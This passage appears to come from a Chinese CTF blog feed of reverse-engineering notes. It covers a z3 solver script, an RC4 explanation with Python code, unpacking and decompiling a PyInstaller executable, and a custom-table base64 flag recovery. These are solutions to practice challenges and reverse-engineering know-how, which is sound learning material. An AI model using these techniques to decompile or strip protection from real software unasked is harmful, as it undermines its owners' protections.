class="line">* a10*<span class="number">11</span> - a11*<span class="number">12</span>) + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(-<span class="number">966296</span> == a0 * <span class="number">1</span> * a1 * <span class="number">2</span> - a2 * <span class="number">3</span> * a3 * <span class="number">4</span> - a4 * <span class="number">5</span> - a5 * <span class="number">6</span> * <span class="number">5</span> + a6 * <span class="number">7</span> + a7 * <span class="number">8</span> * a8</span><br><span class="line">* <span class="number">9</span> + a9 * <span class="number">10</span> * a10 * <span class="number">11</span> - a11 * <span class="number">12</span> - a12 * <span class="number">13</span> + a13 * <span class="number">14</span> - a14 * <span class="number">15</span> - a15 * <span class="number">16</span> * a16 * <span class="number">17</span> -</span><br><span class="line">a17 * <span class="number">18</span> - a18 * <span class="number">19</span> - a19 * <span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">254500223</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> * (a2*<span class="number">3</span> + a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> +</span><br><span class="line">a9*<span class="number">10</span> * a10*<span class="number">11</span>) - a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> - a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> - a18*<span class="number">19</span></span><br><span class="line">* a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">6022286</span> == a0*<span class="number">1</span> - a1*<span class="number">2</span> - a2*<span class="number">3</span> - a3*<span class="number">4</span> * a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> + a9*<span class="number">10</span> *</span><br><span class="line">a10*<span class="number">11</span> - a11*<span class="number">12</span> - a12*<span class="number">13</span> + a13*<span class="number">14</span> + a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> - a18*<span class="number">19</span> - a19*<span class="number">20</span>)</span><br><span class="line">s.add(-<span class="number">636956022</span> == a0 * <span class="number">1</span> * a1 * <span class="number">2</span> + (a2 * <span class="number">3</span> * a3 * <span class="number">4</span> + a4 * <span class="number">5</span> + a5 * <span class="number">6</span> * <span class="number">5</span>) - a6 * <span class="number">7</span> * a7 * <span class="number">8</span></span><br><span class="line">* a8 * <span class="number">9</span> + a9 * <span class="number">10</span> * a10 * <span class="number">11</span> + a11 * <span class="number">12</span> - a12 * <span class="number">13</span> + a13 * <span class="number">14</span> - a14 * <span class="number">15</span> + (a15 * <span class="number">16</span> - a16 *</span><br><span class="line"><span class="number">17</span> + a17 * <span class="number">18</span>) - a18 * <span class="number">19</span> - a19 * <span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">10631829</span> == a0*<span class="number">1</span> * a1*<span class="number">2</span> * a2*<span class="number">3</span> - a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> + a6*<span class="number">7</span> - a7*<span class="number">8</span> * a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">* a10*<span class="number">11</span> + a11*<span class="number">12</span> + a12*<span class="number">13</span> - a13*<span class="number">14</span> - a14*<span class="number">15</span> - a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">6191333</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> + a2*<span class="number">3</span> * (a3*<span class="number">4</span> - a4*<span class="number">5</span> - a5*<span class="number">6</span>*<span class="number">5</span>) + a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> + (a9*<span class="number">10</span></span><br><span class="line">* a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span>) + a13*<span class="number">14</span> * a14*<span class="number">15</span> + (a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span>) + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">890415359</span> == a0*<span class="number">1</span> * a1*<span class="number">2</span> + a2*<span class="number">3</span> * a3*<span class="number">4</span> + a4*<span class="number">5</span> - a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span> * a8*<span class="number">9</span> * a9*<span class="number">10</span></span><br><span class="line">- a10*<span class="number">11</span> - a11*<span class="number">12</span> * a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> * a17*<span class="number">18</span> - a18*<span class="number">19</span> * a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">23493664</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> * a2*<span class="number">3</span> * a3*<span class="number">4</span> - a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> + (a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">+ a10*<span class="number">11</span>) + a11*<span class="number">12</span> - a12*<span class="number">13</span> - a13*<span class="number">14</span> - a14*<span class="number">15</span> + (a15*<span class="number">16</span> - a16*<span class="number">17</span> + a17*<span class="number">18</span> + a18*<span class="number">19</span> +</span><br><span class="line">a19*<span class="number">20</span>))</span><br><span class="line">s.add(<span class="number">1967260144</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> * a2*<span class="number">3</span> - a3*<span class="number">4</span> - a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> * a7*<span class="number">8</span> - a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">- a10*<span class="number">11</span> + a11*<span class="number">12</span> + a12*<span class="number">13</span> - a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    ans = s.model()</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><p>爆破flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">a1 = [<span class="number">104</span>, <span class="number">97</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]</span><br><span class="line">key = [<span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>]</span><br><span class="line">ans = [<span class="number">4615</span>, <span class="number">19616</span>, <span class="number">20257</span>, <span class="number">57</span>, <span class="number">107811</span>, <span class="number">570</span>, <span class="number">2342</span>, <span class="number">19623</span>, <span class="number">25952</span>, <span class="number">54</span>, <span class="number">108955</span>, <span class="number">19624</span>, <span class="number">113632</span>, <span class="number">14085</span>, <span class="number">2342</span>, <span class="number">30675</span>, <span class="number">39576</span>,<span class="number">25979</span>, <span class="number">24</span>, <span class="number">2833</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = [<span class="number">0</span>] * <span class="number">20</span></span><br><span class="line">d = [<span class="number">0</span>] * <span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">x, y</span>):</span><br><span class="line">    v4 = <span class="number">1</span></span><br><span class="line">    v6 = y</span><br><span class="line">    <span class="keyword">while</span> v6:</span><br><span class="line">        <span class="keyword">if</span> (v6 &amp; <span class="number">1</span>) != <span class="number">0</span>:</span><br><span class="line">            v4 *= x</span><br><span class="line">        x = x * x % <span class="number">1000</span></span><br><span class="line">        v6 &gt;&gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> v4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_power</span>(<span class="params">v4, y</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):  <span class="comment"># 枚举可能的 x</span></span><br><span class="line">        <span class="keyword">if</span> power(x, y) == v4:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    d[i] = a1[<span class="number">20</span> - i - <span class="number">1</span>] ^ ans[i]</span><br><span class="line">    <span class="built_in">str</span>[i] = inverse_power(d[i], key[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">str</span>[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4</title>
      <link href="/2025/02/07/RC4/"/>
      <url>/2025/02/07/RC4/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>RC4是一种流加密算法，密钥长度可变，可变范围是1-256字节，属于对称加密算法</p><p><img src="/2025/02/07/RC4/1.png" alt="yuanli"></p><h3 id="生成S-box"><a href="#生成S-box" class="headerlink" title="生成S-box"></a>生成S-box</h3><p>KSA算法初始化长度为256的S盒，用种子密钥(就是我们的秘钥)循环填充另一个256字节的K表，用K表对S表进行初始置换</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]  <span class="comment"># 交换S[i]和S[j]</span></span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="生成密钥流"><a href="#生成密钥流" class="headerlink" title="生成密钥流"></a>生成密钥流</h3><p>PGRA算法根据S盒生成与明文长度相同的密钥流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">PRGA</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]  <span class="comment"># 交换S[i]和S[j]</span></span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="异或加密"><a href="#异或加密" class="headerlink" title="异或加密"></a>异或加密</h3><p>明文字节与密钥流异或</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">key, data</span>):</span><br><span class="line">    S = KSA(key)</span><br><span class="line">    keystream = PRGA(S)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([c ^ <span class="built_in">next</span>(keystream) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[Litctf 2024]ezrc4</p><p>这道题主要是用TLS回调函数修改了key,导致一直没做出来</p><p>对key按X可以发现它在另一个函数也有调用，进入X_X</p><p><img src="/2025/02/07/RC4/2.png" alt="hanshu"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">&#x27;fenkey?&#x27;</span></span><br><span class="line">key1=[<span class="number">0xA</span>,<span class="number">0xC</span>,<span class="number">0x1A</span>,<span class="number">0x8</span>,<span class="number">0x11</span>,<span class="number">0x1F</span>,<span class="number">0x1E</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(key[i])^key1[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到真的key</p><p>在写密文的时候要注意大小端序</p><p>还有一些题是RC4的变形</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python逆向</title>
      <link href="/2025/02/06/python%E9%80%86%E5%90%91/"/>
      <url>/2025/02/06/python%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>[Litctf 2024] ezPython!!!</p><p>今天见到一道python打包成exe文件的逆向题，虽然很简单，但是安装工具遇到了一些麻烦</p><h2 id="将-exe文件反编译为pyc文件"><a href="#将-exe文件反编译为pyc文件" class="headerlink" title="将.exe文件反编译为pyc文件"></a>将.exe文件反编译为pyc文件</h2><p>.pyinstxtractor.py工具安装地址：<a href="https://sourceforge.net/projects/pyinstallerextractor/">https://sourceforge.net/projects/pyinstallerextractor/</a>  </p><p>先将<code>pyinstxtractor.py</code>工具与我们要反编译的<code>.exe</code>文件放入同一个工作目录下,在终端输入python pyinstxtractor.py 文件名.py</p><p>😕因为python版本问题，imp模块无法安装，需要替换为importlibc,(pip install importlib)但是又提示importlibc没有get_magic方法，需要替换为importlib.util.MAGIC_NUMBER，又又提示module ‘importlib’ has no attribute ‘util’，于是写上from importlib.util import find_spec 成功</p><p>发现工作目录下多了一个名为<code>文件名.exe_extracted</code>的文件夹，进入该文件夹，里面有许许多多后缀为<code>.dll</code>和<code>.pyd</code>的文件，还有一个名为<code>PYZ-00.pyz_extracted</code>的文件夹，这个文件夹里放的是程序引入的<strong>依赖库</strong></p><p>找到与exe文件同名的文件和struct文件，手动添加.pyc,用010editor打开，文件是没有Magic Number的，需要手动添加</p><p><img src="/2025/02/06/python%E9%80%86%E5%90%91/1.png" alt="结果"></p><p>根据上面可以看出程序的py版本，根据版本填充magic number</p><p>Python3.3 以下版本： 只有Magic Number和四位时间戳<br>Python3.3(包含) - Python3.7(不包含)版本： 4个字节的magic num + 8个字节的时间戳，这个时间戳可以全是0。<br>Python3.7(包含)版本： 4个字节的magic num + 4个字节的空白数据 + 4个字节的时间戳 + 4个字节的文件长度，除了magic num，其它数据可以全是0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">enum PycMagic &#123;</span><br><span class="line">    <span class="comment"># 小端序，要倒过来写</span></span><br><span class="line">    MAGIC_1_0 = <span class="number">0x00999902</span>,</span><br><span class="line">    MAGIC_1_1 = <span class="number">0x00999903</span>, /* Also covers <span class="number">1.2</span> */</span><br><span class="line">    MAGIC_1_3 = <span class="number">0x0A0D2E89</span>,</span><br><span class="line">    MAGIC_1_4 = <span class="number">0x0A0D1704</span>,</span><br><span class="line">    MAGIC_1_5 = <span class="number">0x0A0D4E99</span>,</span><br><span class="line">    MAGIC_1_6 = <span class="number">0x0A0DC4FC</span>,</span><br><span class="line"> </span><br><span class="line">    MAGIC_2_0 = <span class="number">0x0A0DC687</span>,</span><br><span class="line">    MAGIC_2_1 = <span class="number">0x0A0DEB2A</span>,</span><br><span class="line">    MAGIC_2_2 = <span class="number">0x0A0DED2D</span>,</span><br><span class="line">    MAGIC_2_3 = <span class="number">0x0A0DF23B</span>,</span><br><span class="line">    MAGIC_2_4 = <span class="number">0x0A0DF26D</span>,</span><br><span class="line">    MAGIC_2_5 = <span class="number">0x0A0DF2B3</span>,</span><br><span class="line">    MAGIC_2_6 = <span class="number">0x0A0DF2D1</span>,</span><br><span class="line">    MAGIC_2_7 = <span class="number">0x0A0DF303</span>,</span><br><span class="line"> </span><br><span class="line">    MAGIC_3_0 = <span class="number">0x0A0D0C3A</span>,</span><br><span class="line">    MAGIC_3_1 = <span class="number">0x0A0D0C4E</span>,</span><br><span class="line">    MAGIC_3_2 = <span class="number">0x0A0D0C6C</span>,</span><br><span class="line">    MAGIC_3_3 = <span class="number">0x0A0D0C9E</span>,</span><br><span class="line">    MAGIC_3_4 = <span class="number">0x0A0D0CEE</span>,</span><br><span class="line">    MAGIC_3_5 = <span class="number">0x0A0D0D16</span>,</span><br><span class="line">    MAGIC_3_5_3 = <span class="number">0x0A0D0D17</span>,</span><br><span class="line">    MAGIC_3_6 = <span class="number">0x0A0D0D33</span>,</span><br><span class="line">    MAGIC_3_7 = <span class="number">0x0A0D0D42</span>,</span><br><span class="line">    MAGIC_3_8 = <span class="number">0x0A0D0D55</span>,</span><br><span class="line">    MAGIC_3_9 = <span class="number">0x0A0D0D61</span>,</span><br><span class="line">    MAGIC_3_10 = <span class="number">0x0A0D0D6F</span>,</span><br><span class="line">    MAGIC_3_11 = <span class="number">0x0A0D0DA7</span>,</span><br><span class="line">    MAGIC_3_12 = <span class="number">0x0A0D0DCB</span>,</span><br><span class="line"> </span><br><span class="line">    INVALID = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="pyc文件转py源码"><a href="#pyc文件转py源码" class="headerlink" title="pyc文件转py源码"></a>pyc文件转py源码</h2><p>uncompyle6 现仅适用于 Python 2.4 到 3.8 版本</p><p>安装：pip install -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a> uncompyle6&#x3D;&#x3D;3.9.0</p><p>uncompyle6 -o 文件名.py 文件名.pyc</p><p>😕但是这道题要用到的是pycdc,安装包：git clone <a href="https://github.com/zrax/pycdc.git">https://github.com/zrax/pycdc.git</a> ，不过下载的是源码，需要用cmake编译，在生成的build文件夹中找到pycdc.exe</p><p>将pyc文件与pacdc.exe放在同一目录，终端.\pycdc.exe 文件名.pyc</p><p>得到源码：</p><p><img src="/2025/02/06/python%E9%80%86%E5%90%91/2.png" alt="jieguo"></p><p>好像是base64编码,但是引用的是自己编写的模块，应该是换表了</p><p>🤔上面我们说<code>PYZ-00.pyz_extracted</code>的文件夹里放的是程序引入的<strong>依赖库</strong>，果然找到了Litctfbase64.pyc,尝试用pycdc还原，但是提示CreateObject: Got unsupported type 0x0<br>Error loading file Litctfbase64.pyc: bad cast</p><p>😖没找到解决办法</p><p>用010editor查看16进制：</p><p><img src="/2025/02/06/python%E9%80%86%E5%90%91/3.png" alt="jieguo"></p><p>😮突然发现这个文件是带magic number的，直接复制就行了</p><p>有一串可疑的字符串，可能是映射表，不过不知道从哪里开始</p><p>然后打开一个pyc在线反编译的网站，得到了字符串：</p><p><img src="/2025/02/06/python%E9%80%86%E5%90%91/4.png" alt="jieguo"></p><p>直接base64解码就好了</p><h2 id="py是如何转换成exe的呢"><a href="#py是如何转换成exe的呢" class="headerlink" title="py是如何转换成exe的呢"></a>py是如何转换成exe的呢</h2><p>pyinstaller打包</p><p>首先安装加密打包程序所使用的库<code>tinyaes</code>，这里用了<code>清华源</code>并且指定使用了<code>1.0.3</code>版本库</p><p>pip install -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a> tinyaes&#x3D;&#x3D;1.0.3</p><p>移动到脚本文件夹下：pyinstaller -F 测试脚本.py –key 123456</p><p>加密后结果只有入口脚本反编译成功，被依赖的脚本均被加密，无法直接被反编译</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse刷题笔记</title>
      <link href="/2024/12/06/Reverse%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/06/Reverse%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="HUBUCTF-2022-新生赛-simple-RE"><a href="#HUBUCTF-2022-新生赛-simple-RE" class="headerlink" title="[HUBUCTF 2022 新生赛]simple_RE"></a>[HUBUCTF 2022 新生赛]simple_RE</h2><p>附件是.exe文件</p><p>用ida打开F5反汇编得到：</p><p><img src="/2024/12/06/Reverse%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/1.png" alt="反汇编C代码"></p><p>sub_401570函数对输入的flag进行变换，memcmp函数用于判断两个字符串的前n个字符是否相等</p><p>进入sub_401570：</p><p><img src="/2024/12/06/Reverse%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/2.png" alt="函数代码"></p><p><img src="/2024/12/06/Reverse%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/3.png" alt="函数代码"></p><p>(经过chatgpt分析) 分析出这个函数的功能：</p><p><img src="/2024/12/06/Reverse%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/4.png" alt="函数功能"></p><p>到这里我认为只要把已知字符串进行base64解码就行，发现是乱码</p><p>经过wp提示，原来是base64换表</p><p>aQvejafhmuyjbac&#x3D;”qvEJAfHmUYjBac+u8Ph5n9Od17FrICL&#x2F;X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD”是映射表</p><p>写脚本复原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD+/&quot;</span></span><br><span class="line">table2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">if</span> i == table[j]:</span><br><span class="line">            flag += table2[j]</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>base64原理：<a href="https://www.cnblogs.com/xiaxveliang/p/15097947.html">https://www.cnblogs.com/xiaxveliang/p/15097947.html</a></p><p>base64代码识别：</p><p><img src="/2024/12/06/Reverse%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/5.png" alt="daima"></p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
